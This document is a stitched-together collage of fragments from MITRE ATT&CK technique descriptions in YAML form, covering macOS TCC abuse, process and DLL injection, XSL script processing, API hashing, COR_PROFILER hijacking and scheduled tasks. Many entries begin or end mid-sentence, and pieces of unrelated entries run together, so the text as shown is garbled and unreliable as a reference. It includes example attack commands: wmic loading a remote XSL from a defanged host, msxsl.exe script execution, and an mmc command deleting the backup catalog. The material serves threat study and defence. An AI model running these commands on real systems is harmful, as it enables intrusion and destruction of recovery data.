        Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).

        When an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.(Citation: welivesecurity TCC)

        Adversaries may access restricted data or services protected by TCC through abusing applications previously granted permissions through [Process Injection](https://attack.mitre.org/techniques/T1055) or executing a malicious binary using another application. For example, adversaries can use Finder, a macOS native app with FDA permissions, to execute a malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002). When executing under the Finder App, the malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002) inherits access to all files on the system without requiring a user prompt. When System Integrity Protection (SIP) is disabled, TCC protections are also disabled. For a system without SIP enabled, adversaries can manipulate the TCC database to add permissions to their malicious executable through loading an adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation: TCC macOS bypass)(Citation: TCC Database)

        commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>)
        then invoking that memory with <code>PTRACE_SETREGS</code> to set the register
        containing the next instruction to execute. Ptrace system call injection can
        also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>,
        which copy data to a specific address in the target processes’ memory (ex:

      description: |-
        Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.

        API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)

        To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.

        Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)

      description: "Adversaries may abuse list-view controls to inject malicious code
        into hijacked processes in order to evade process-based defenses as well as
        possibly elevate privileges. ListPlanting is a method of executing arbitrary
        code in the address space of a separate live process.(Citation: Hexacorn Listplanting)
        Code executed via ListPlanting may also evade detection from security products
        since the execution is masked under a legitimate process.\n\nList-view controls
        are user interface windows used to display collections of items.(Citation:
        Microsoft List View Controls) Information about an application's list-view
        settings are stored within the process' memory in a <code>SysListView32</code>
        control.\n\nListPlanting (a form of message-passing \"shatter attack\") may
        be performed by copying code into the virtual address space of a process that
        uses a list-view control then using that code as a custom callback for sorting
        the listed items.(Citation: Modexp Windows Process Injection) Adversaries
        must first copy code into the target process’ memory space, which can be performed
        various ways including by directly obtaining a handle to the <code>SysListView32</code>
        child of the victim process window (via Windows API calls such as <code>FindWindow</code>
        and/or <code>EnumWindows</code>) or other [Process Injection](https://attack.mitre.org/techniques/T1055)
        methods.\n\nSome variations of ListPlanting may allocate memory in the target
        process but then use window messages to copy the payload, to avoid the use
        of the highly monitored <code>WriteProcessMemory</code> function. For example,
        an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code>
        API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code>
        messages, effectively copying a payload 2 bytes at a time to the allocated
        memory.(Citation: ESET InvisiMole June 2020) \n\nFinally, the payload is triggered
        by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code>
        child of the process window, with the payload within the newly allocated buffer
        passed and executed as the <code>ListView_SortItems</code> callback."

      name: XSL Script Processing
      description: |-
        Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)

        Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)

        Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)

        * <code>msxsl.exe customers[.]xml script[.]xsl</code>
        * <code>msxsl.exe script[.]xsl script[.]xsl</code>
        * <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

        Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)

        Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)

        * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
        * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>

      name: 'Hide Artifacts: Hidden Files and Directories'
      description: |-
        Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).

        On Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.

        Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.

        Additionally, adversaries may name files in a manner that would allow the file to be hidden such as naming a file only a “space” character.

        Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.

        An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.

        An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)

      name: Application Access Token
      description: "Adversaries may use stolen application access tokens to bypass
        the typical authentication process and access restricted accounts, information,
        or services on remote systems. These tokens are typically stolen from users
        or services and used in lieu of login credentials.\n\nApplication access tokens
        are used to make authorized API requests on behalf of a user or service and
        are commonly used to access resources in cloud, container-based applications,
        and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always
        Use Access Tokens to Secure APIs Sept 2019) \n\nOAuth is one commonly implemented
        framework that issues tokens to users for access to systems. These frameworks
        are used collaboratively to verify the user and determine what actions the
        user is allowed to perform. Once identity is established, the token allows
        actions to be authorized, without passing the actual credentials of the user.
        Therefore, compromise of the token can grant the adversary access to resources
        of other sites through a malicious application.(Citation: okta)\n\nFor example,
        with a cloud-based email service, once an OAuth access token is granted to
        a malicious application, it can potentially gain long-term access to features
        of the user account if a \"refresh\" token enabling background access is awarded.(Citation:
        Microsoft Identity Platform Access 2019) With an OAuth access token an adversary
        can use the user-granted REST API to perform functions such as email searching
        and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised
        access tokens may be used as an initial step in compromising other services.
        For example, if a token grants access to a victim’s primary email, the adversary
        may be able to extend access to all other services which the target subscribes
        by triggering forgotten password routines. In AWS and GCP environments, adversaries
        can trigger a request for a short-lived access token with the privileges of
        another user account.(Citation: Google Cloud Service Account Credentials)(Citation:
        AWS Temporary Security Credentials) The adversary can then use this token
        to request data or perform actions the original account could not. If permissions
        for this feature are misconfigured – for example, by allowing all users to
        request a token for a particular account - an adversary may be able to gain
        initial access to a Cloud Account or escalate their privileges.(Citation:
        Rhino Security Labs Enumerating AWS Roles)\n\nDirect API access through a
        token negates the effectiveness of a second authentication factor and may
        be immune to intuitive countermeasures like changing passwords.  For example,
        in AWS environments, an adversary who compromises a user’s AWS API credentials
        may be able to use the `sts:GetFederationToken` API call to create a federated
        user session, which will have the same permissions as the original user but
        may persist even if the original user credentials are deactivated.(Citation:
        Crowdstrike AWS User Federation Persistence) Additionally, access abuse over
        an API channel can be difficult to detect even from the service provider end,
        as the access can still align well with a legitimate workflow."

        perform actions to achieve Initial Access, Persistence, Privilege Escalation,
        or Defense Evasion. Cloud accounts are those created and configured by an
        organization for use by users, remote support, services, or for administration
        of resources within a cloud service provider or SaaS application. Cloud Accounts
        can exist solely in the cloud; alternatively, they may be hybrid-joined between
        on-premises systems and the cloud through syncing or federation with other
        identity sources such as Windows Active Directory.(Citation: AWS Identity
        Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying
        AD Federation)\n\nService or user accounts may be targeted by adversaries
        through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566),
        or various other means to gain access to the environment. Federated or synced
        accounts may be a pathway for the adversary to affect both on-premises systems
        and cloud environments - for example, by leveraging shared credentials to
        log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High
        privileged cloud accounts, whether federated, synced, or cloud-only, may also

        cloud account to maintain persistence in the environment. Such credentials
        may also be used to bypass security controls such as multi-factor authentication.
        \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)
        or other privileges through various means within the environment. Misconfigurations
        in role assignments or role assumption policies may allow an adversary to
        use these mechanisms to leverage permissions outside the intended scope of
        the account. Such over privileged accounts may be used to harvest sensitive
        data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009)
        or other methods. For example, in Azure environments, adversaries may target
        Azure Managed Identities, which allow associated Azure resources to request
        access tokens. By compromising a resource with an attached Managed Identity,

      description: |-
        Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)

        Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).

        Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.

        Like other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.

        Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)

        Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)

      description: "Adversaries may inject dynamic-link libraries (DLLs) into processes
        in order to evade process-based defenses as well as possibly elevate privileges.
        DLL injection is a method of executing arbitrary code in the address space
        of a separate live process.  \n\nDLL injection is commonly performed by writing
        the path to a DLL in the virtual address space of the target process before
        loading the DLL by invoking a new thread. The write can be performed with
        native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>,
        then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code>
        API responsible for loading the DLL). (Citation: Elastic Process Injection
        July 2017) \n\nVariations of this method such as reflective DLL injection
        (writing a self-mapping DLL into a process) and memory module (map DLL when
        writing into process) overcome the address relocation issue as well as the
        additional APIs to invoke execution (since these methods load and execute
        the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation:
        Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July
        2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading
        or DLL Hollowing, may be leveraged to conceal injected code within a process.
        This method involves loading a legitimate DLL into a remote process then manually
        overwriting the module's <code>AddressOfEntryPoint</code> before starting
        a new thread in the target process.(Citation: Module Stomping for Shellcode
        Injection) This variation allows attackers to hide malicious injected code
        by potentially backing its execution with a legitimate DLL file on disk.(Citation:
        Hiding Malicious Code with Module Stomping) \n\nRunning code in the context
        of another process may allow access to the process's memory, system/network
        resources, and possibly elevated privileges. Execution via DLL injection may
        also evade detection from security products since the execution is masked
        under a legitimate process. "

      description: |-
        Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

        Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.

        Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.

        [Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock)

      description: |-
        Adversaries may use compression to obfuscate their payloads or files. Compressed file formats such as ZIP, gzip, 7z, and RAR can compress and archive multiple files together to make it easier and faster to transfer files. In addition to compressing files, adversaries may also compress shellcode directly - for example, in order to store it in a Windows Registry key (i.e., [Fileless Storage](https://attack.mitre.org/techniques/T1027/011)).(Citation: Trustwave Pillowmint June 2020)

        In order to further evade detection, adversaries may combine multiple ZIP files into one archive. This process of concatenation creates an archive that appears to be a single archive but in fact contains the central directories of the embedded archives. Some ZIP readers, such as 7zip, may not be able to identify concatenated ZIP files and miss the presence of the malicious payload.(Citation: Perception Point)

        File archives may be sent as one [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) through email. Adversaries have sent malicious payloads as archived files to encourage the user to interact with and extract the malicious payload onto their system (i.e., [Malicious File](https://attack.mitre.org/techniques/T1204/002)).(Citation: NTT Security Flagpro new December 2021) However, some file compression tools, such as 7zip, can be used to produce self-extracting archives. Adversaries may send self-extracting archives to hide the functionality of their payload and launch it without requiring multiple actions from the user.(Citation: The Hacker News)

        [Compression](https://attack.mitre.org/techniques/T1027/015) may be used in combination with [Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013) where compressed files are encrypted and password-protected.

      description: |-
        Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.

        Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)

      description: "Adversaries may install an older version of the operating system
        of a network device to weaken security.  Older operating system versions on
        network devices often have weaker encryption ciphers and, in general, fewer/less
        updated defensive features. (Citation: Cisco Synful Knock Evolution)\n\nOn
        embedded devices, downgrading the version typically only requires replacing
        the operating system file in storage.  With most embedded devices, this can
        be achieved by downloading a copy of the desired version of the operating
        system file and reconfiguring the device to boot from that file on next system
        restart.  The adversary could then restart the device to implement the change
        immediately or they could wait until the next time the system restarts.\n\nDowngrading
        the system image to an older versions may allow an adversary to evade defenses
        by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).
        \ Downgrading of a system image can be done on its own, or it can be used

      name: Exploitation for Defense Evasion
      description: |-
        Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.

        Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.

        There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)

        Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.

        Smart App Control is a feature of Windows that blocks applications it considers potentially malicious from running by verifying unsigned applications against a known safe list from a Microsoft cloud service before executing them.(Citation: Microsoft Smart App Control) However, adversaries may leverage "reputation hijacking" to abuse an operating system’s trust of safe, signed applications that support the execution of arbitrary code. By leveraging [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127) to run their malicious code, adversaries may bypass Smart App Control protections.(Citation: Elastic Security Labs)

      description: "Adversaries may abuse mmc.exe to proxy execution of malicious
        .msc files. Microsoft Management Console (MMC) is a binary that may be signed
        by Microsoft and is used in several ways in either its GUI or in a command
        prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create,
        open, and save custom consoles that contain administrative tools created by
        Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems
        locally or remotely. MMC can also be used to open Microsoft created .msc files
        to manage system configuration.(Citation: win_msc_files_overview)\n\nFor example,
        <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved
        console msc file in author mode.(Citation: win_mmc) Another common example
        is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application
        window. \n\nAdversaries may use MMC commands to perform malicious tasks. For
        example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup
        catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490))
        without prompts to the user (Note: <code>wbadmin.msc</code> may only be present
        by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation:
        phobos_virustotal)\n\nAdversaries may also abuse MMC to execute malicious
        .msc files. For example, adversaries may first create a malicious registry
        Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object
        Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation:
        win_clsid_key) Then, adversaries may create custom consoles with the “Link
        to Web Address” snap-in that is linked to the malicious CLSID subkey.(Citation:
        mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious
        CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>.(Citation:
        abusing_com_reg)"

      name: Process Argument Spoofing
      description: |-
        Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation: Xpn Argue Like Cobalt 2019)

        Adversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)

        Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021)

        This behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections.

        Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)

        The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)

        Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)

      name: 'Process Injection: Extra Window Memory Injection'
      description: "Adversaries may inject malicious code into process via Extra Window
        Memory (EWM) in order to evade process-based defenses as well as possibly
        elevate privileges. EWM injection is a method of executing arbitrary code
        in the address space of a separate live process. \n\nBefore creating a window,
        graphical Windows-based processes must prescribe to or register a windows
        class, which stipulate appearance and behavior (via windows procedures, which
        are functions that handle input/output of data).(Citation: Microsoft Window
        Classes) Registration of new windows classes can include a request for up
        to 40 bytes of EWM to be appended to the allocated memory of each instance
        of that class. This EWM is intended to store data specific to that window
        and has specific application programming interface (API) functions to set
        and get its value. (Citation: Microsoft GetWindowLong function) (Citation:
        Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough
        to store a 32-bit pointer and is often used to point to a windows procedure.
        Malware may possibly utilize this memory location in part of an attack chain
        that includes writing code to shared sections of the process’s memory, placing
        a pointer to the code in EWM, then invoking execution by returning execution
        control to the address in the process’s EWM.\n\nExecution granted through
        EWM injection may allow access to both the target process's memory and possibly
        elevated privileges. Writing payloads to shared sections also avoids the use
        of highly monitored API calls such as <code>WriteProcessMemory</code> and
        <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July
        2017) More sophisticated malware samples may also potentially bypass protection
        mechanisms such as data execution prevention (DEP) by triggering a combination
        of windows procedures and other system functions that will rewrite the malicious
        payload inside an executable portion of the target process.  (Citation: MalwareTech
        Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning
        code in the context of another process may allow access to the process's memory,
        system/network resources, and possibly elevated privileges. Execution via
        EWM injection may also evade detection from security products since the execution
        is masked under a legitimate process. "

      description: "Adversaries may abuse the Windows Task Scheduler to perform task
        scheduling for initial or recurring execution of malicious code. There are
        multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111)
        utility can be run directly on the command line, or the Task Scheduler can
        be opened through the GUI within the Administrator Tools section of the Control
        Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET
        wrapper for the Windows Task Scheduler, and alternatively, adversaries have
        used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
        (WMI) to create a scheduled task. Adversaries may also utilize the Powershell
        Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to
        create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red
        Team)\n\nAn adversary may use Windows Task Scheduler to execute programs at
        system startup or on a scheduled basis for persistence. The Windows Task Scheduler
        can also be abused to conduct remote Execution as part of Lateral Movement
        and/or to run a process under the context of a specified account (such as
        SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),
        adversaries have also abused the Windows Task Scheduler to potentially mask
        one-time execution under signed/trusted system processes.(Citation: ProofPoint
        Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide
        Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible
        to defender tools and manual queries used to enumerate tasks. Specifically,
        an adversary may hide a task from `schtasks /query` and the Task Scheduler
        by deleting the associated Security Descriptor (SD) registry value (where
        deletion of this value must be completed using SYSTEM permissions).(Citation:
        SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate
        methods to hide tasks, such as altering the metadata (e.g., `Index` value)

        environment variables used to load libraries. The PATH environment variable
        contains a list of directories (User and System) that the OS searches sequentially
        through in search of the binary that was called from a script or the command
        line. \n\nAdversaries can place a malicious program in an earlier entry in
        the list of directories stored in the PATH environment variable, resulting
        in the operating system executing the malicious binary rather than the legitimate
        binary when it searches sequentially through that PATH listing.\n\nFor example,
        on Windows if an adversary places a malicious program named \"net.exe\" in
